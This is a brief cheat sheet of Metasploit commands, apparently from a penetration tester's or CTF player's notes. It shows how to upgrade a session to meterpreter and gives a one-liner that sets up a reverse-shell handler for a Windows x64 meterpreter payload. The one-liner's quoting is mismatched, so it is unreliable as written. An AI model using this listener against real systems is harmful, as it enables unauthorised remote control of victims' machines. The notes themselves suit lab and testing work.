# Metasploit commands


upgrade recent session to meterpreter session: `sessions -u -1`

One-liner for setting up a listener
```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT "6666'; exploit"
```
